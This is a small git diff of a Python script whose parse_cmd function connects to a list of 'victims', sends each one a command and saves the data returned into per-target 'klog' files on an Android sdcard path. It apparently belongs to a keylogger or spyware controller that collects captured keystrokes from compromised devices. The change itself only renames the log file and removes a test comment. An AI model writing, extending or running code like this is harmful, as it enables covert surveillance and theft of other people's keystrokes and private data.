@@ -70,7 +70,7 @@ def parse_cmd(victims, PORT):
         s.connect((target, PORT))
         print(s.recv(26).decode('utf-8'))
         s.send(intent.encode())
-        f = open('/sdcard/oyesklog_' + target + '.txt', 'w')
+        f = open('/sdcard/oyes_klog_' + target + '.txt', 'w')
         l = s.recv(1024)
         while l:
             f.write(l.decode('utf-8'))
@@ -111,5 +111,3 @@ def parse_cmd(victims, PORT):
 
 if __name__ == "__main__":
     main()
-
-# git test
